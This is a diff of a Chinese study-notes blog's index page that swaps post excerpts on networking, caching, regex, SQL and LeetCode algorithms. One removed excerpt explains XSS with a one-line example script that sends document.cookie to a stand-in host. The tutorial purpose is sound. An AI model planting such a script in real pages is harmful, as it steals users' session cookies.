@@ -246,6 +246,167 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://sometwo7.github.io/blog/blog/349cf1a4.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Sometwo">
+      <meta itemprop="description" content="一些学习笔记与人生的妄想。<br/>Nameless want to be someone, <br/> but end to nobody. <br/> Maybe sometwo this time.">
+      <meta itemprop="image" content="/blog/pics/e4a8b75f94b06499ad0078f58954e6a8.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="搬运工">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+            
+            <a href="/blog/349cf1a4.html" class="post-title-link" itemprop="url">Leetcode 算法思想</a>
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2020-01-03 09:01:32 / 修改时间：07:29:55" itemprop="dateCreated datePublished" datetime="2020-01-03T09:01:32+00:00">2020-01-03</time>
+            </span>
+          
+            
+
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/blog/categories/leetcode/" itemprop="url" rel="index"><span itemprop="name">leetcode</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <ul>
+<li><a href="#算法思想">算法思想</a><ul>
+<li><a href="#二分查找">二分查找</a></li>
+<li><a href="#贪心思想">贪心思想</a></li>
+<li><a href="#双指针">双指针</a></li>
+<li><a href="#排序">排序</a><ul>
+<li><a href="#快速选择">快速选择</a></li>
+<li><a href="#堆排序">堆排序</a></li>
+<li><a href="#桶排序">桶排序</a></li>
+</ul>
+</li>
+<li><a href="#搜索">搜索</a><ul>
+<li><a href="#bfs">BFS</a></li>
+<li><a href="#dfs">DFS</a></li>
+<li><a href="#backtracking">Backtracking</a></li>
+</ul>
+</li>
+<li><a href="#分治">分治</a></li>
+<li><a href="#动态规划">动态规划</a><ul>
+<li><a href="#分割整数">分割整数</a></li>
+<li><a href="#矩阵路径">矩阵路径</a></li>
+<li><a href="#斐波那契数列">斐波那契数列</a></li>
+<li><a href="#最长递增子序列">最长递增子序列</a></li>
+<li><a href="#最长公共子系列">最长公共子系列</a></li>
+<li><a href="#0-1-背包">0-1 背包</a></li>
+<li><a href="#数组区间">数组区间</a></li>
+<li><a href="#字符串编辑">字符串编辑</a></li>
+<li><a href="#其它问题">其它问题</a></li>
+</ul>
+</li>
+<li><a href="#数学">数学</a><ul>
+<li><a href="#素数">素数</a></li>
+<li><a href="#最大公约数">最大公约数</a></li>
+<li><a href="#进制转换">进制转换</a></li>
+<li><a href="#阶乘">阶乘</a></li>
+<li><a href="#字符串加法减法">字符串加法减法</a></li>
+<li><a href="#相遇问题">相遇问题</a></li>
+<li><a href="#多数投票问题">多数投票问题</a></li>
+<li><a href="#其它">其它</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#数据结构相关">数据结构相关</a><ul>
+<li><a href="#栈和队列">栈和队列</a></li>
+<li><a href="#哈希表">哈希表</a></li>
+<li><a href="#字符串">字符串</a></li>
+<li><a href="#数组与矩阵">数组与矩阵</a><ul>
+<li><a href="#1-n-分布">1-n 分布</a></li>
+<li><a href="#有序矩阵">有序矩阵</a></li>
+</ul>
+</li>
+<li><a href="#链表">链表</a></li>
+<li><a href="#树">树</a><ul>
+<li><a href="#递归">递归</a></li>
+<li><a href="#层次遍历">层次遍历</a></li>
+<li><a href="#前中后序遍历">前中后序遍历</a></li>
+<li><a href="#bst">BST</a></li>
+<li><a href="#trie">Trie</a></li>
+</ul>
+</li>
+<li><a href="#图">图</a></li>
+<li><a href="#位运算">位运算</a></li>
+</ul>
+</li>
+<li><a href="#参考资料">参考资料</a><!-- GFM-TOC -->
+
+
+</li>
+</ul>
+          <!--noindex-->
+          
+            <div class="post-button">
+              <a class="btn" href="/blog/349cf1a4.html" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+          <div class="post-eof"></div>
+        
+      </footer>
+  </article>
+  
+  
+  
+
+    
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://sometwo7.github.io/blog/blog/94c303a9.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -275,11 +436,19 @@
                 
               
 
-              <time title="创建时间：2019-12-17 09:49:19 / 修改时间：08:44:09" itemprop="dateCreated datePublished" datetime="2019-12-17T09:49:19+00:00">2019-12-17</time>
+              <time title="创建时间：2019-12-17 09:49:19" itemprop="dateCreated datePublished" datetime="2019-12-17T09:49:19+00:00">2019-12-17</time>
             </span>
           
             
 
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-01-03 07:29:55" itemprop="dateModified" datetime="2020-01-03T07:29:55+00:00">2020-01-03</time>
+              </span>
             
           
             <span class="post-meta-item">
@@ -378,7 +547,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2019-12-17 08:44:09" itemprop="dateModified" datetime="2019-12-17T08:44:09+00:00">2019-12-17</time>
+                <time title="修改时间：2020-01-03 07:29:55" itemprop="dateModified" datetime="2020-01-03T07:29:55+00:00">2020-01-03</time>
               </span>
             
           
@@ -481,7 +650,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2019-12-17 08:44:09" itemprop="dateModified" datetime="2019-12-17T08:44:09+00:00">2019-12-17</time>
+                <time title="修改时间：2020-01-03 07:29:55" itemprop="dateModified" datetime="2020-01-03T07:29:55+00:00">2020-01-03</time>
               </span>
             
           
@@ -584,7 +753,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2019-12-17 08:44:09" itemprop="dateModified" datetime="2019-12-17T08:44:09+00:00">2019-12-17</time>
+                <time title="修改时间：2020-01-03 07:29:55" itemprop="dateModified" datetime="2020-01-03T07:29:55+00:00">2020-01-03</time>
               </span>
             
           
@@ -688,7 +857,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2019-12-17 08:44:09" itemprop="dateModified" datetime="2019-12-17T08:44:09+00:00">2019-12-17</time>
+                <time title="修改时间：2020-01-03 07:29:55" itemprop="dateModified" datetime="2020-01-03T07:29:55+00:00">2020-01-03</time>
               </span>
             
           
@@ -752,7 +921,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://sometwo7.github.io/blog/blog/ecffdd03.html">
+    <link itemprop="mainEntityOfPage" href="https://sometwo7.github.io/blog/blog/64a35ad1.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Sometwo">
@@ -766,7 +935,7 @@
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
             
-            <a href="/blog/ecffdd03.html" class="post-title-link" itemprop="url">网络技术 - Socket</a>
+            <a href="/blog/64a35ad1.html" class="post-title-link" itemprop="url">网络技术 - 缓存</a>
           
         </h1>
 
@@ -792,7 +961,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2019-12-17 08:44:09" itemprop="dateModified" datetime="2019-12-17T08:44:09+00:00">2019-12-17</time>
+                <time title="修改时间：2020-01-03 07:29:55" itemprop="dateModified" datetime="2020-01-03T07:29:55+00:00">2020-01-03</time>
               </span>
             
           
@@ -821,20 +990,18 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="一、I-O-模型"><a href="#一、I-O-模型" class="headerlink" title="一、I/O 模型"></a>一、I/O 模型</h1><p>一个输入操作通常包括两个阶段：</p><ul>
-<li>等待数据准备好</li>
-<li>从内核向进程复制数据</li>
-</ul><p>对于一个套接字上的输入操作，第一步通常涉及等待数据从网络中到达。当所等待数据到达时，它被复制到内核中的某个缓冲区。第二步就是把数据从内核缓冲区复制到应用进程缓冲区。</p><p>Unix 有五种 I/O 模型：</p><ul>
-<li>阻塞式 I/O</li>
-<li>非阻塞式 I/O</li>
-<li>I/O 复用（select 和 poll）</li>
-<li>信号驱动式 I/O（SIGIO）</li>
-<li>异步 I/O（AIO）</li>
+          <h1 id="一、缓存特征"><a href="#一、缓存特征" class="headerlink" title="一、缓存特征"></a>一、缓存特征</h1><h2 id="命中率"><a href="#命中率" class="headerlink" title="命中率"></a>命中率</h2><p>当某个请求能够通过访问缓存而得到响应时，称为缓存命中。</p><p>缓存命中率越高，缓存的利用率也就越高。</p><h2 id="最大空间"><a href="#最大空间" class="headerlink" title="最大空间"></a>最大空间</h2><p>缓存通常位于内存中，内存的空间通常比磁盘空间小的多，因此缓存的最大空间不可能非常大。</p><p>当缓存存放的数据量超过最大空间时，就需要淘汰部分数据来存放新到达的数据。</p><h2 id="淘汰策略"><a href="#淘汰策略" class="headerlink" title="淘汰策略"></a>淘汰策略</h2><ul>
+<li><p>FIFO（First In First Out）：先进先出策略，在实时性的场景下，需要经常访问最新的数据，那么就可以使用 FIFO，使得最先进入的数据（最晚的数据）被淘汰。</p>
+</li>
+<li><p>LRU（Least Recently Used）：最近最久未使用策略，优先淘汰最久未使用的数据，也就是上次被访问时间距离现在最久的数据。该策略可以保证内存中的数据都是热点数据，也就是经常被访问的数据，从而保证缓存命中率。</p>
+</li>
+<li><p>LFU（Least Frequently Used）：最不经常使用策略，优先淘汰一段时间内使用次数最少的数据。</p>
+</li>
 </ul>
           <!--noindex-->
           
             <div class="post-button">
-              <a class="btn" href="/blog/ecffdd03.html" rel="contents">
+              <a class="btn" href="/blog/64a35ad1.html" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -861,7 +1028,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://sometwo7.github.io/blog/blog/877061f8.html">
+    <link itemprop="mainEntityOfPage" href="https://sometwo7.github.io/blog/blog/38ddab86.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Sometwo">
@@ -875,7 +1042,7 @@
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
             
-            <a href="/blog/877061f8.html" class="post-title-link" itemprop="url">网络技术 - 攻击技术</a>
+            <a href="/blog/38ddab86.html" class="post-title-link" itemprop="url">网络技术 - 正则表达式</a>
           
         </h1>
 
@@ -901,7 +1068,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2019-12-17 08:44:09" itemprop="dateModified" datetime="2019-12-17T08:44:09+00:00">2019-12-17</time>
+                <time title="修改时间：2020-01-03 07:29:55" itemprop="dateModified" datetime="2020-01-03T07:29:55+00:00">2020-01-03</time>
               </span>
             
           
@@ -930,11 +1097,11 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="一、跨站脚本攻击"><a href="#一、跨站脚本攻击" class="headerlink" title="一、跨站脚本攻击"></a>一、跨站脚本攻击</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。</p><h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>例如有一个论坛网站，攻击者可以在上面发布以下内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">location.href=<span class="string">"//domain.com/?c="</span> + <span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+          <h1 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h1><p>正则表达式用于文本内容的查找和替换。</p><p>正则表达式内置于其它语言或者软件产品中，它本身不是一种语言或者软件。</p><p><a href="https://regexr.com/" target="_blank" rel="noopener">正则表达式在线工具</a></p><h1 id="二、匹配单个字符"><a href="#二、匹配单个字符" class="headerlink" title="二、匹配单个字符"></a>二、匹配单个字符</h1><p><strong>.</strong>  可以用来匹配任何的单个字符，但是在绝大多数实现里面，不能匹配换行符；</p><p><strong>.</strong>  是元字符，表示它有特殊的含义，而不是字符本身的含义。如果需要匹配 . ，那么要用 \ 进行转义，即在 . 前面加上 \ 。</p>
           <!--noindex-->
           
             <div class="post-button">
-              <a class="btn" href="/blog/877061f8.html" rel="contents">
+              <a class="btn" href="/blog/38ddab86.html" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -961,7 +1128,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://sometwo7.github.io/blog/blog/685bfdc8.html">
+    <link itemprop="mainEntityOfPage" href="https://sometwo7.github.io/blog/blog/d350a2b7.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Sometwo">
@@ -975,7 +1142,7 @@
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
             
-            <a href="/blog/685bfdc8.html" class="post-title-link" itemprop="url">网络技术 - Git</a>
+            <a href="/blog/d350a2b7.html" class="post-title-link" itemprop="url">网络技术 - 分布式</a>
           
         </h1>
 
@@ -1001,7 +1168,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2019-12-17 08:44:09" itemprop="dateModified" datetime="2019-12-17T08:44:09+00:00">2019-12-17</time>
+                <time title="修改时间：2020-01-03 07:29:55" itemprop="dateModified" datetime="2020-01-03T07:29:55+00:00">2020-01-03</time>
               </span>
             
           
@@ -1030,11 +1197,14 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="集中式与分布式"><a href="#集中式与分布式" class="headerlink" title="集中式与分布式"></a>集中式与分布式</h1><p>Git 属于分布式版本控制系统，而 SVN 属于集中式。</p><div align="center"> <img src="pics/1fe2dc77-9a2d-4643-90b3-bbf50f649bac.png" width="600px"> </div><br><p>集中式版本控制只有中心服务器拥有一份代码，而分布式版本控制每个人的电脑上就有一份完整的代码。</p><p>集中式版本控制有安全性问题，当中心服务器挂了所有人都没办法工作了。</p><p>集中式版本控制需要连网才能工作，如果网速过慢，那么提交一个文件会慢的无法让人忍受。而分布式版本控制不需要连网就能工作。</p>
+          <h1 id="一、分布式锁"><a href="#一、分布式锁" class="headerlink" title="一、分布式锁"></a>一、分布式锁</h1><p>在单机场景下，可以使用语言的内置锁来实现进程同步。但是在分布式场景下，需要同步的进程可能位于不同的节点上，那么就需要使用分布式锁。</p><p>阻塞锁通常使用互斥量来实现：</p><ul>
+<li>互斥量为 0 表示有其它进程在使用锁，此时处于锁定状态；</li>
+<li>互斥量为 1 表示未锁定状态。</li>
+</ul><p>1 和 0 可以用一个整型值表示，也可以用某个数据是否存在表示。</p>
           <!--noindex-->
           
             <div class="post-button">
-              <a class="btn" href="/blog/685bfdc8.html" rel="contents">
+              <a class="btn" href="/blog/d350a2b7.html" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -1061,7 +1231,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://sometwo7.github.io/blog/blog/7a9a193e.html">
+    <link itemprop="mainEntityOfPage" href="https://sometwo7.github.io/blog/blog/4ce9f201.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Sometwo">
@@ -1075,7 +1245,7 @@
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
             
-            <a href="/blog/7a9a193e.html" class="post-title-link" itemprop="url">网络技术 - 面向对象思想</a>
+            <a href="/blog/4ce9f201.html" class="post-title-link" itemprop="url">网络技术 - SQL</a>
           
         </h1>
 
@@ -1101,7 +1271,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2019-12-17 08:44:09" itemprop="dateModified" datetime="2019-12-17T08:44:09+00:00">2019-12-17</time>
+                <time title="修改时间：2020-01-03 07:29:55" itemprop="dateModified" datetime="2020-01-03T07:29:55+00:00">2020-01-03</time>
               </span>
             
           
@@ -1130,120 +1300,11 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="一、三大特性"><a href="#一、三大特性" class="headerlink" title="一、三大特性"></a>一、三大特性</h1><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><p>利用抽象数据类型将数据和基于数据的操作封装在一起，使其构成一个不可分割的独立实体。数据被保护在抽象数据类型的内部，尽可能地隐藏内部的细节，只保留一些对外的接口使其与外部发生联系。用户无需关心对象内部的细节，但可以通过对象对外提供的接口来访问该对象。</p><p>优点：</p><ul>
-<li>减少耦合：可以独立地开发、测试、优化、使用、理解和修改</li>
-<li>减轻维护的负担：可以更容易被程序员理解，并且在调试的时候可以不影响其他模块</li>
-<li>有效地调节性能：可以通过剖析来确定哪些模块影响了系统的性能</li>
-<li>提高软件的可重用性</li>
-<li>降低了构建大型系统的风险：即使整个系统不可用，但是这些独立的模块却有可能是可用的</li>
-</ul>
+          <h1 id="一、基础"><a href="#一、基础" class="headerlink" title="一、基础"></a>一、基础</h1><p>模式定义了数据如何存储、存储什么样的数据以及数据如何分解等信息，数据库和表都有模式。</p><p>主键的值不允许修改，也不允许复用（不能将已经删除的主键值赋给新数据行的主键）。</p><p>SQL（Structured Query Language)，标准 SQL 由 ANSI 标准委员会管理，从而称为 ANSI SQL。各个 DBMS 都有自己的实现，如 PL/SQL、Transact-SQL 等。</p>
           <!--noindex-->
           
             <div class="post-button">
-              <a class="btn" href="/blog/7a9a193e.html" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-          <div class="post-eof"></div>
-        
-      </footer>
-  </article>
-  
-  
-  
-
-    
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://sometwo7.github.io/blog/blog/78b8663.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Sometwo">
-      <meta itemprop="description" content="一些学习笔记与人生的妄想。<br/>Nameless want to be someone, <br/> but end to nobody. <br/> Maybe sometwo this time.">
-      <meta itemprop="image" content="/blog/pics/e4a8b75f94b06499ad0078f58954e6a8.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="搬运工">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-            
-            <a href="/blog/78b8663.html" class="post-title-link" itemprop="url">网络技术 - 集群</a>
-          
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              
-                
-              
-
-              <time title="创建时间：2019-11-05 10:02:11" itemprop="dateCreated datePublished" datetime="2019-11-05T10:02:11+00:00">2019-11-05</time>
-            </span>
-          
-            
-
-            
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2019-12-17 08:44:09" itemprop="dateModified" datetime="2019-12-17T08:44:09+00:00">2019-12-17</time>
-              </span>
-            
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/blog/categories/网络技术/" itemprop="url" rel="index"><span itemprop="name">网络技术</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="一、负载均衡"><a href="#一、负载均衡" class="headerlink" title="一、负载均衡"></a>一、负载均衡</h1><p>集群中的应用服务器（节点）通常被设计成无状态，用户可以请求任何一个节点。</p><p>负载均衡器会根据集群中每个节点的负载情况，将用户请求转发到合适的节点上。</p><p>负载均衡器可以用来实现高可用以及伸缩性：</p><ul>
-<li>高可用：当某个节点故障时，负载均衡器会将用户请求转发到另外的节点上，从而保证所有服务持续可用；</li>
-<li>伸缩性：根据系统整体负载情况，可以很容易地添加或移除节点。</li>
-</ul>
-          <!--noindex-->
-          
-            <div class="post-button">
-              <a class="btn" href="/blog/78b8663.html" rel="contents">
+              <a class="btn" href="/blog/4ce9f201.html" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -1318,7 +1379,7 @@
         
           <a href="/blog/archives/">
         
-          <span class="site-state-item-count">92</span>
+          <span class="site-state-item-count">93</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1389,7 +1450,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
   <span class="with-love" id="animate">
     <i class="fa fa-heart"></i>
   </span>
